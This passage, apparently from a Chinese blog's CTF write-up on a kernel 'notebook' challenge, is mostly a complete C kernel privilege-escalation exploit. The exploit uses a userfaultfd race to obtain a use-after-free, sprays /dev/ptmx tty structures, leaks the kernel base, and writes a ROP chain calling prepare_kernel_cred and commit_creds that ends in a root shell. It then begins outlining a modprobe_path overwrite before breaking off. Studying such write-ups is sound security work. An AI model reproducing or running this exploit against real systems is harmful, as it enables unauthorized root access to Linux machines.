class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint32_t</span> u32;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> uffd, note_fd;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> fault_page, fault_page_len;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> target, modprobe_path;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> errExit(msg) &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">\tperror(msg);       \\</span></span><br><span class=\"line\"><span class=\"meta\">\texit(1);\t\t   \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> idx;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> size;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> buf;</span><br><span class=\"line\">&#125;userarg;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_ELEM 0x100</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span>&#123;</span> </span><br><span class=\"line\">\tSWAPGS_POP_RET, IRETQ, COMMIT_CREDS,</span><br><span class=\"line\">\tPREPARE_KERNEL_CRED, </span><br><span class=\"line\">\tSUB_RSP_RET ,PUSH_RDI_POP_RSP_POP_RET,</span><br><span class=\"line\">\tPOP_RDI ,POP_RSP,</span><br><span class=\"line\">\tMOV_RDI_RAX_POP_RET,</span><br><span class=\"line\">\tTERMINATOR</span><br><span class=\"line\">&#125;;<span class=\"comment\">//PREPARE_KERNEL_CRED, COMMIT_CREDS, &#125;;</span></span><br><span class=\"line\">u64 a[MAX_ELEM];</span><br><span class=\"line\"><span class=\"comment\">//tty_struct结构体的大小</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class=\"line\"><span class=\"comment\">//如果我们申请0x2E0的空间，slab分配的堆实际大小为0x400 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REAL_HEAP_SIZE 0x400</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> RAW_KERNEL_BASE 0xffffffff81000000</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect1[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> ptmx_fds[<span class=\"number\">0x100</span>];<span class=\"comment\">// 测了我很久才发现这个b被不知道谁溢出了 加两个保护挡一下</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect2[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">init</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\ta[SWAPGS_POP_RET] \t\t\t= <span class=\"number\">0xffffffff810637d4</span>;</span><br><span class=\"line\">\ta[IRETQ] \t\t\t\t\t= <span class=\"number\">0xffffffff810338bb</span>;</span><br><span class=\"line\">\ta[COMMIT_CREDS] \t\t\t= <span class=\"number\">0xffffffff810a9b40</span>;</span><br><span class=\"line\">\ta[PREPARE_KERNEL_CRED]\t\t= <span class=\"number\">0xffffffff810a9ef0</span>;</span><br><span class=\"line\">\ta[SUB_RSP_RET] \t\t\t\t= <span class=\"number\">0xffffffff8100354f</span>;</span><br><span class=\"line\">\ta[PUSH_RDI_POP_RSP_POP_RET] = <span class=\"number\">0xffffffff8143f4e1</span>;</span><br><span class=\"line\">\ta[POP_RDI]\t\t\t\t    = <span class=\"number\">0xffffffff81007115</span>;</span><br><span class=\"line\">\ta[POP_RSP] \t\t\t\t\t= <span class=\"number\">0xffffffff810bc110</span>;</span><br><span class=\"line\">\ta[MOV_RDI_RAX_POP_RET]\t\t= <span class=\"number\">0xffffffff81045833</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">addKernelBase</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; TERMINATOR ;i++)&#123;</span><br><span class=\"line\">\t\ta[i] += kernel_base_addr - <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getshell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;UID is %d&quot;</span>, getuid());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;Get shell&quot;</span>);</span><br><span class=\"line\">\t\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\tPanic(<span class=\"string\">&quot;Get shell failed&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 user_cs, user_ss, user_sp, user_flags;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t__asm__ (</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pop user_flags;&quot;</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *(*pkc)(<span class=\"type\">int</span>) = (<span class=\"type\">void</span> *(*)(<span class=\"type\">int</span>))(a[PREPARE_KERNEL_CRED]);</span><br><span class=\"line\">\t<span class=\"type\">void</span> (*cc)(<span class=\"type\">void</span> *) = (<span class=\"type\">void</span> (*)(<span class=\"type\">void</span> *))(a[COMMIT_CREDS]);</span><br><span class=\"line\">\t(*cc)((*pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> size, <span class=\"type\">void</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)size;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x100</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">del</span><span class=\"params\">(<span class=\"type\">size_t</span> idx)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x200</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)newsize;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x300</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">gift</span><span class=\"params\">(<span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">100</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_to_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\twrite(note_fd, user_buf, idx);<span class=\"comment\">// 逆向 mynote_read可以得到</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\tread(note_fd, user_buf, idx);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">char</span> *buf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">void</span> *buf;</span><br><span class=\"line\">\tu64 size;</span><br><span class=\"line\">&#125;notebook;</span><br><span class=\"line\"></span><br><span class=\"line\">notebook ntbk[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> heap[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> notebook_addr;</span><br><span class=\"line\">u64 fake_tty_struct[<span class=\"number\">128</span>];</span><br><span class=\"line\">u64 fake_tty_ops[<span class=\"number\">128</span>];</span><br><span class=\"line\"><span class=\"type\">char</span> zero[PAGE_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tinit();</span><br><span class=\"line\">\tsaveState();</span><br><span class=\"line\"></span><br><span class=\"line\">\tnote_fd = open(<span class=\"string\">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;note_fd is %d&quot;</span>,note_fd);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(note_fd &lt; <span class=\"number\">0</span>) errExit(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbuf = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);<span class=\"comment\">// name的长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFILE * stream = popen(<span class=\"string\">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\tassert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tfread(buf, <span class=\"number\">0x10</span> + <span class=\"number\">2</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">\tmod_base_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault_page = mmap(<span class=\"literal\">NULL</span>, <span class=\"number\">0x1000</span>, PROT_READ|PROT_WRITE, </span><br><span class=\"line\">\t\t\t\t\t\tMAP_PRIVATE | MAP_ANONYMOUS, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tfault_page_len = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\tuffd_register();</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">0</span> ,<span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x3ff</span> ,zero);<span class=\"comment\">// 重新申请一个0x400的块</span></span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x400</span> ,fault_page);<span class=\"comment\">// 返回上一个原块的地址 写完size就卡住</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)&#123;</span><br><span class=\"line\">\t\tInfo(<span class=\"string\">&quot;ptmx_fds[%d] is %d&quot;</span>, i, ptmx_fds[i]);</span><br><span class=\"line\">\t\tptmx_fds[i] = open(<span class=\"string\">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;fake_tty_struct&#x27;s addr is 0x%lx&quot;</span>, fake_tty_struct);</span><br><span class=\"line\">\t<span class=\"comment\">// 此时gdb看内存 可以看到相关泄漏的地址</span></span><br><span class=\"line\">\tkernel_base_addr = fake_tty_struct[<span class=\"number\">3</span>] - <span class=\"number\">0xe8e440</span>;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class=\"line\">\taddKernelBase();</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>, <span class=\"number\">0x60</span>, zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>, zero);<span class=\"comment\">// ROP</span></span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>, <span class=\"number\">0x60</span>, zero);<span class=\"comment\">// tty ops </span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgift(ntbk);</span><br><span class=\"line\">\tu64 tty_ops_addr = ntbk[<span class=\"number\">2</span>].buf;</span><br><span class=\"line\">\tu64 rop_addr = ntbk[<span class=\"number\">1</span>].buf;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;rop&#x27;s addr is 0x%lx&quot;</span>, rop_addr);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;tty_ops_addr&#x27;s addr is 0x%lx&quot;</span>, tty_ops_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">3</span>] \t\t= tty_ops_addr;</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8100354f                  sub    rsp, 0xffffffffffffff80</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff81003553                  pop    rbx</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff81003554                  pop    rbp</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff81003555                  ret </span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">1</span>] \t\t= a[SUB_RSP_RET];<span class=\"comment\">// rsp + 0x80 + pop * 2 = 18 * 8</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">0x14</span>]\t= a[POP_RSP];<span class=\"comment\">// 1 + 18 + 1 = 0x14</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">0x15</span>]\t= rop_addr;<span class=\"comment\">// 第二次栈迁移</span></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;write_to_kernel(0, fake_tty_struct);&quot;</span>);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// write operation , rdi is tty_struct&#x27;s addr</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e1                  push   rdi</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e2                  pop    rsp</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e3                  pop    rbp</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e4                  or     eax, edx</span></span><br><span class=\"line\"><span class=\"comment\">\t\t0xffffffff8143f4e6                  ret </span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tfake_tty_ops[<span class=\"number\">7</span>] = a[PUSH_RDI_POP_RSP_POP_RET];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tu64 ROP[<span class=\"number\">0x20</span>];<span class=\"comment\">// 这个ROP是要写入内核的 不需要去打CR4关smep</span></span><br><span class=\"line\">\tROP[i++] = a[POP_RDI];</span><br><span class=\"line\">\tROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tROP[i++] = a[PREPARE_KERNEL_CRED];<span class=\"comment\">// rax = prepare_kernel_cred(0)</span></span><br><span class=\"line\">\tROP[i++] = a[MOV_RDI_RAX_POP_RET];<span class=\"comment\">// rdi = rax</span></span><br><span class=\"line\">\tROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tROP[i++] = a[COMMIT_CREDS];<span class=\"comment\">// commit_creds(rdi) get root</span></span><br><span class=\"line\">\tROP[i++] = a[SWAPGS_POP_RET];</span><br><span class=\"line\">\tROP[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tROP[i++] = a[IRETQ];</span><br><span class=\"line\">\tROP[i++] = (u64)getshell;</span><br><span class=\"line\">\tROP[i++] = user_cs;</span><br><span class=\"line\">\tROP[i++] = user_flags;</span><br><span class=\"line\">\tROP[i++] = user_sp;</span><br><span class=\"line\">\tROP[i++] = user_ss;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;write_to_kernel(1, ROP)&quot;</span>);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">1</span>, ROP);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;write_to_kernel(2, fake_tty_ops)&quot;</span>);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">2</span>, fake_tty_ops);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> tmp[] = <span class=\"string\">&quot;squsqusqusqu&quot;</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;Spray write ptmx start&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Dbg(&quot;fd is [%d]&quot;, ptmx_fds[i]);</span></span><br><span class=\"line\">\t\twrite(ptmx_fds[i], tmp, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;exploit&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_api</span> <span class=\"title\">ua</span>;</span><span class=\"comment\">// io operation api</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_register</span> <span class=\"title\">ur</span>;</span><span class=\"comment\">// io register</span></span><br><span class=\"line\">    <span class=\"comment\">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class=\"line\">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class=\"line\"></span><br><span class=\"line\">\tua.api = UFFD_API;</span><br><span class=\"line\">\tua.features = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tur.range.start = (<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fault_page;</span><br><span class=\"line\">\tur.range.len   = fault_page_len;</span><br><span class=\"line\">\tur.mode \t   = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thr;</span><br><span class=\"line\">\t<span class=\"comment\">// 注意这里没有-1 pthread create正常返回0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pthread_create(&amp;thr, <span class=\"literal\">NULL</span>, UFFD_handler ,<span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;pthread_create&quot;</span>);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;regitser&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>&#123;</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;UFFD handler start&quot;</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffd_msg</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pollfd</span> <span class=\"title\">pollfd</span>;</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> nready = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpollfd.fd\t\t= uffd;</span><br><span class=\"line\">\t\tpollfd.events\t= POLLIN ;</span><br><span class=\"line\">\t\tnready = poll(&amp;pollfd, <span class=\"number\">1</span>, <span class=\"number\">-1</span>);<span class=\"comment\">// block here</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(nready != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;poll&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">// user code modify area</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x500</span>, zero);<span class=\"comment\">// 第一个edit free掉vuln chunk</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x400</span>, zero);<span class=\"comment\">// 第二个edit 确保size不变</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(read(uffd, &amp;msg, <span class=\"keyword\">sizeof</span>(msg)) != <span class=\"keyword\">sizeof</span>(msg))</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;read&quot;</span>);</span><br><span class=\"line\">\t\tassert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_copy</span> <span class=\"title\">uc</span>;</span></span><br><span class=\"line\">\t\tuc.src \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)zero;</span><br><span class=\"line\">\t\tuc.dst \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)fault_page;</span><br><span class=\"line\">\t\tuc.len \t= fault_page_len;</span><br><span class=\"line\">\t\tuc.mode = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;ioctl done&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/09/11/kernel-notebook-three-solutions/2.png\" alt=\"Pasted image 20220910222000\"></p>\n<h2 id=\"modprobe\"><a class=\"markdownIt-Anchor\" href=\"#modprobe\">#</a> modprobe</h2>\n<p>篡改 modprobe 执行特权指令</p>\n<p>write 没加锁 轻而易举配合 uffd 写 uaf</p>\n<p>一个是注意泄漏 cookie</p>\n<p>另外一个就是链表结尾的异或表达式 （给 name 给你写就是方便伪造这个的）</p>\n<ul>\n<li>通过 gift 泄漏得到结构体 <code>notebook</code>  的地址信息 由于是 c 程序进行交互，所以有了 notebook 地址信息 就能通过指针任意读取内部的其他信息了 比如 cookie</li>\n<li>利用 setxattr 和 uffd 进行任意 uaf 劫持 篡改 notebook 通过 ko 中的 call 重定向泄漏内核基址</li>\n<li>另外一个指针劫持到 <code>notebook</code>  的地址 这样就能继续篡改 让其指向 <code>modprobe_path</code></li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 